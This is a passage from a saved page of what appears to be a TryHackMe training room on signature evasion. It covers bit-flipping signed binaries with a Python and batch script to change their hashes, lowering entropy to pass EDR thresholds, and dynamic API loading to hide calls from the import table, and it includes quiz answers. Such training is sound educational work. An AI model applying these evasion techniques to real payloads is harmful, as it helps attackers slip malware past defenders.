	current <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token builtin" data-pf_style_display="inline" data-pf_style_visibility="visible">list</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>orig<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span>
	current<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span>i<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token builtin" data-pf_style_display="inline" data-pf_style_visibility="visible">chr</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token builtin" data-pf_style_display="inline" data-pf_style_visibility="visible">ord</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>current<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span>i<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">^</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0xde</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span>
	path <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"%d.exe"</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">%</span> i
	
	output <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">""</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>join<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token builtin" data-pf_style_display="inline" data-pf_style_visibility="visible">str</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>e<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">for</span> e <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">in</span> current<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span>
	<span class="token builtin" data-pf_style_display="inline" data-pf_style_visibility="visible">open</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>path<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"wb"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>write<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>output<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span>
	i <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">+=</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">1</span>
	
<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">print</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"done"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span>
</code></pre>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Once the list is created, we must search for intact unique properties of the file. For example, if we are bit-flipping <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">msbuild</code>, we need to use <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">signtool</code> to search for a file with a useable certificate. This will guarantee that the functionality of the file is not broken, and the application will maintain its signed attribution.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">We can leverage a script to loop through the bit-flipped list and verify functional variants. Below is an example of a batch script implementation.</p>
<pre class=" language-powershell" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-powershell" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">FOR</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">/</span>L <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">%</span><span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">%</span>A IN <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>1<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>1<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>10000<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">DO</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>
	signtool verify <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">/</span>v <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">/</span>a flipped\\<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">%</span><span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">%</span>A<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>exe
<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span>
</code></pre>
<p data-pf_style_display="block" data-pf_style_visibility="visible">This technique can be very lucrative, although it can take a long time and will only have a limited period until the hash is discovered. Below is a comparison of the original MSBuild application and the bit-flipped variation.</p><p style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><img src="./TryHackMe _ Signature Evasion_files/ab3f859f9dc34e6c4b41fe3437b2396d.png" alt="Image of WinMD5Free showing the hash of Original.exe" style="width:468.25px;height:217.703px" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="468.25" data-pf_rect_height="217.703125" class="pf-large-image"><img src="./TryHackMe _ Signature Evasion_files/3adf6b9caad98324a399a2a00775e37c.png" alt="down arrow" style="width:117.984px;height:117.984px" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="117.96875" data-pf_rect_height="117.96875"><img src="./TryHackMe _ Signature Evasion_files/3e4c0050212e7c69d408135de36976a3.png" alt="Image of WinMD5Free showing the hash of Variant.exe" style="width:457.5px;height:215.456px" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="457.5" data-pf_rect_height="215.453125" class="pf-large-image"><br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><hr data-pf_style_display="block" data-pf_style_visibility="visible"><h3 data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Entropy</span></h3><p data-pf_style_display="block" data-pf_style_visibility="visible">From <a href="https://www.ibm.com/docs/en/qsip/7.4?topic=content-analyzing-files-embedded-malicious-activity" data-pf_style_display="inline" data-pf_style_visibility="visible">IBM</a>, Entropy is defined as â€œthe randomness of the data in a file used to determine whether a file contains hidden data or suspicious scripts.â€ EDRs and other scanners often leverage entropy to identify potential suspicious files or contribute to an overall malicious score.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Entropy can be problematic for obfuscated scripts, specifically when obscuring identifiable information such as variables or functions.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">To lower entropy, we can replace random identifiers with randomly selected English words. For example, we may change a variable from <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">q234uf</code> to <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">nature</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">To prove the efficacy of changing identifiers, we can observe how the entropy changes using <a href="https://gchq.github.io/CyberChef/#recipe=Entropy(&#39;Shannon%20scale&#39;)" data-pf_style_display="inline" data-pf_style_visibility="visible">CyberChef</a>.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Below is the Shannon entropy scale for a standard English paragraph.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">






</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><strong data-pf_style_display="inline" data-pf_style_visibility="visible">Shannon entropy: 4.587362034903882</strong></p><p style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><img src="./TryHackMe _ Signature Evasion_files/96630d6dbe47ad3204cc121e9b5bf84e.png" alt="Status bar showing the entropy of an english paragraph" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="890" data-pf_rect_height="108" class="pf-large-image"><strong data-pf_style_display="inline" data-pf_style_visibility="visible"><br data-pf_style_display="inline" data-pf_style_visibility="visible"></strong></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Below is the Shannon entropy scale for a small script with random identifiers.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">
</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><strong data-pf_style_display="inline" data-pf_style_visibility="visible">Shannon entropy: 5.341436973971389</strong></p><p style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><img src="./TryHackMe _ Signature Evasion_files/92db2f5431d34098678bbcbf8170af52.png" alt="Status bar showing the entropy of a small script with randomization" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="890" data-pf_rect_height="108" class="pf-large-image"><strong data-pf_style_display="inline" data-pf_style_visibility="visible"><br data-pf_style_display="inline" data-pf_style_visibility="visible"></strong></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Depending on the EDR employed, a â€œsuspiciousâ€ entropy value is&nbsp;<span style="font-weight:bolder" data-pf_style_display="inline" data-pf_style_visibility="visible">~ greater than 6.8</span>.<strong data-pf_style_display="inline" data-pf_style_visibility="visible"><br data-pf_style_display="inline" data-pf_style_visibility="visible"></strong></p>
<div data-pf_style_display="block" data-pf_style_visibility="visible">
<p data-pf_style_display="block" data-pf_style_visibility="visible">The difference between a random value and English text will become amplified with a larger file and more occurrences.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Note that entropy will generally never be used alone and only to support a hypothesis. For example, the entropy for the command <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">pskill</code> and the hivenightmare exploit are almost identical.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">To see entropy in action, letâ€™s look at how an EDR would use it to contribute to threat indicators.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">



</p><p data-pf_style_display="block" data-pf_style_visibility="visible">In the white paper, <a href="https://www.mdpi.com/2624-800X/1/3/21/pdf" data-pf_style_display="inline" data-pf_style_visibility="visible">An Empirical Assessment of Endpoint Detection and Response Systems against  Advanced Persistent Threats Attack Vectors</a><i data-pf_style_display="inline" data-pf_style_visibility="visible">, </i><b data-pf_style_display="inline" data-pf_style_visibility="visible">SentinelOne </b><i data-pf_style_display="inline" data-pf_style_visibility="visible">is shown to detect a DLL due to high entropy, specifically through AES encryption.</i></p>
</div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Using CyberChef, obtain the Shannon entropy of the file: <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">C:\Users\Student\Desktop\Binaries\shell.exe</code>.</span><br data-pf_style_display="inline" data-pf_style_visibility="visible"></p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="5" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-success task-answer" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            Question Done
                        </button>
                        </div>
                        <div class="room-task-input-hint" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <i class="fal fa-lightbulb" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Hint
                      </button>
                        </div>
                    </div><div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible">Rounded to three decimal places, what is the Shannon entropy of the file?</p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *.***" value="6.354" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="2" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="5" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-success task-answer" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-6" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse6" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title hacker-green" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 6                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="fas fa-check-circle" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Behavioral Signatures
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse6" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-complete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscating functions and properties can achieve a lot with minimal modification. Even after breaking static signatures attached to a file, modern engines may still observe the behavior and functionality of the binary. This presents numerous problems for attackers that cannot be solved with simple obfuscation.</span><br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><p data-pf_style_display="block" data-pf_style_visibility="visible">As covered in <a href="https://tryhackme.com/room/introtoav" data-pf_style_display="inline" data-pf_style_visibility="visible">Introduction to Anti-Virus</a>, modern anti-virus engines will employ two common methods to detect behavior: observing imports and hooking known malicious calls. While imports, as will be covered in this task, can be easily obfuscated or modified with minimal requirements, hooking requires complex techniques out of scope for this room. Because of the prevalence of API calls specifically, observing these functions can be a significant factor in determining if a file is suspicious, along with other behavioral tests/considerations.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Before diving too deep into rewriting or importing calls, letâ€™s discuss how API calls are traditionally utilized and imported. We will cover C-based languages first and then briefly cover .NET-based languages later in this task.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">API calls and other functions native to an operating system require a pointer to a function address and a structure to utilize them.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Structures for functions are simple; they are located in&nbsp;<strong data-pf_style_display="inline" data-pf_style_visibility="visible">import libraries</strong> such as <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">kernel32</code> or <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">ntdll</code> that store function structures and other core information for Windows.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">The most significant issue to function imports is the function addresses. Obtaining a pointer may seem straightforward, although because of <strong data-pf_style_display="inline" data-pf_style_visibility="visible">ASLR</strong> (<strong data-pf_style_display="inline" data-pf_style_visibility="visible">A</strong>ddress <strong data-pf_style_display="inline" data-pf_style_visibility="visible">S</strong>pace <strong data-pf_style_display="inline" data-pf_style_visibility="visible">L</strong>ayout <strong data-pf_style_display="inline" data-pf_style_visibility="visible">R</strong>andomization), function addresses are dynamic and must be found.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Rather than altering code at runtime, the <strong data-pf_style_display="inline" data-pf_style_visibility="visible">Windows loader</strong> <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">windows.h</code> is employed. At runtime, the loader will map all modules to process address space and list all functions from each. That handles the modules, but how are function addresses assigned?</p><p data-pf_style_display="block" data-pf_style_visibility="visible">One of the most critical functions of the Windows loader is the <strong data-pf_style_display="inline" data-pf_style_visibility="visible">IAT (I</strong>mport <strong data-pf_style_display="inline" data-pf_style_visibility="visible">A</strong>ddress <strong data-pf_style_display="inline" data-pf_style_visibility="visible">T</strong>able). The IAT will store function addresses for all imported functions that can assign a pointer for the function.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">The IAT is stored in the <strong data-pf_style_display="inline" data-pf_style_visibility="visible">PE</strong> (<strong data-pf_style_display="inline" data-pf_style_visibility="visible">P</strong>ortable <strong data-pf_style_display="inline" data-pf_style_visibility="visible">E</strong>xecutable) header <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">IMAGE_OPTIONAL_HEADER</code> and is filled by the Windows loader at runtime. The Windows loader obtains the function addresses or, more precisely, <strong data-pf_style_display="inline" data-pf_style_visibility="visible">thunks</strong> from a pointer table, accessed from an API call or <strong data-pf_style_display="inline" data-pf_style_visibility="visible">thunk table</strong>. Check out the <a href="https://tryhackme.com/room/windowsinternals" data-pf_style_display="inline" data-pf_style_visibility="visible">Windows Internals room</a> for more information about the PE structure.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">








</p><p data-pf_style_display="block" data-pf_style_visibility="visible">At a glance, an API is assigned a pointer to a thunk as the function address from the Windows loader. To make this a little more tangible, we can observe an example of the PE dump for a function.</p><p style="text-align:center" data-pf_style_display="block" data-pf_style_visibility="visible"><img src="./TryHackMe _ Signature Evasion_files/0d4ba9ba4348b53036cb2127f4968e87.png" alt="Image of DiE showing the IAT table of a binary" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="705" data-pf_rect_height="634" class="pf-large-image"><br data-pf_style_display="inline" data-pf_style_visibility="visible"></p><hr data-pf_style_display="block" data-pf_style_visibility="visible">
<p data-pf_style_display="block" data-pf_style_visibility="visible">The import table can provide a lot of insight into the functionality of a binary that can be detrimental to an adversary. But how can we prevent our functions from appearing in the IAT if it is required to assign a function address?</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">As briefly mentioned, the thunk table is not the only way to obtain a pointer for a function address. We can also utilize an API call to obtain the function address from the import library itself. This technique is known as <strong data-pf_style_display="inline" data-pf_style_visibility="visible">dynamic loading</strong> and can be used to avoid the IAT and minimize the use of the Windows loader.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">We will write our structures and create new arbitrary names for functions to employ dynamic loading.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">At a high level, we can break up dynamic loading in C languages into four steps,</p>
<ol data-pf_style_display="block" data-pf_style_visibility="visible">
<li data-pf_style_display="list-item" data-pf_style_visibility="visible">Define the structure of the call</li>
<li data-pf_style_display="list-item" data-pf_style_visibility="visible">Obtain the handle of the module the call address is present in</li>
<li data-pf_style_display="list-item" data-pf_style_visibility="visible">Obtain the process address of the call</li>
<li data-pf_style_display="list-item" data-pf_style_visibility="visible">Use the newly created call</li>
</ol>
<p data-pf_style_display="block" data-pf_style_visibility="visible">To begin dynamically loading an API call, we must first define a structure for the call before the main function. The call structure will define any inputs or outputs that may be required for the call to function. We can find structures for a specific call on the Microsoft documentation. For example, the structure for <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">GetComputerNameA</code> can be found&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea" data-pf_style_display="inline" data-pf_style_visibility="visible">here</a>. Because we are implementing this as a new call in C, the syntax must change a little, but the structure stays the same, as seen below.</p>
<pre data-pf_style_display="block" data-pf_style_visibility="visible"><pre class=" language-cpp" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-cpp" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token comment" data-pf_style_display="inline" data-pf_style_visibility="visible">// 1. Define the structure of the call</span>
<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">typedef</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">BOOL</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WINAPI<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span> myNotGetComputerNameA<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>
	LPSTR   lpBuffer<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>
	LPDWORD nSize
<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span></code></pre></pre>
<p data-pf_style_display="block" data-pf_style_visibility="visible">To access the address of the API call, we must first load the library where it is defined. We will define this in the main function. This is commonly <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">kernel32.dll</code> or <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">ntdll.dll</code> for any Windows API calls. Below is an example of the syntax required to load a library into a module handle.</p>
<pre data-pf_style_display="block" data-pf_style_visibility="visible"><pre class=" language-cpp" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-cpp" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token comment" data-pf_style_display="inline" data-pf_style_visibility="visible">// 2. Obtain the handle of the module the call address is present in </span>
HMODULE hkernel32 <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">LoadLibraryA</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"kernel32.dll"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span></code></pre></pre>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Using the previously loaded module, we can obtain the process address for the specified API call. This will come directly after the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">LoadLibrary</code> call. We can store this call by casting it along with the previously defined structure. Below is an example of the syntax required to obtain the API call.</p>
<pre data-pf_style_display="block" data-pf_style_visibility="visible"><pre class=" language-c" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-c" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token comment" data-pf_style_display="inline" data-pf_style_visibility="visible">// 3. Obtain the process address of the call</span>
myNotGetComputerNameA notGetComputerNameA <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>myNotGetComputerNameA<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">GetProcAddress</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>hkernel32<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"GetComputerNameA"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span></code></pre></pre>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Although this method solves many concerns and problems, there are still several considerations that must be noted. Firstly, <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">GetProcAddress</code> and <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">LoadLibraryA</code> are still present in the IAT; although not a direct indicator it can lead to or reinforce suspicion; this problem can be solved using <strong data-pf_style_display="inline" data-pf_style_visibility="visible">PIC</strong> (<strong data-pf_style_display="inline" data-pf_style_visibility="visible">P</strong>osition <strong data-pf_style_display="inline" data-pf_style_visibility="visible">I</strong>ndependent <strong data-pf_style_display="inline" data-pf_style_visibility="visible">C</strong>ode). Modern agents will also hook specific functions and monitor kernel interactions; this can be solved using <strong data-pf_style_display="inline" data-pf_style_visibility="visible">API unhooking</strong>.</p><hr data-pf_style_display="block" data-pf_style_visibility="visible"><p data-pf_style_display="block" data-pf_style_visibility="visible">Using the knowledge you have accrued throughout this task, obfuscate the following C snippet, ensuring no suspicious API calls are present in the IAT.</p><pre class=" language-c" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-c" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token macro property" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token directive-hash" data-pf_style_display="inline" data-pf_style_visibility="visible">#</span><span class="token directive keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">include</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">&lt;windows.h&gt;</span></span>
<span class="token macro property" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token directive-hash" data-pf_style_display="inline" data-pf_style_visibility="visible">#</span><span class="token directive keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">include</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">&lt;stdio.h&gt;</span></span>
<span class="token macro property" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token directive-hash" data-pf_style_display="inline" data-pf_style_visibility="visible">#</span><span class="token directive keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">include</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">&lt;lm.h&gt;</span></span>

<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">main</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>
    <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">printf</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"GetComputerNameA: 0x%p\\n"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> GetComputerNameA<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
    CHAR hostName<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span><span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">260</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
    DWORD hostNameLength <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">260</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
    <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">if</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">GetComputerNameA</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>hostName<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">&amp;</span>hostNameLength<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>
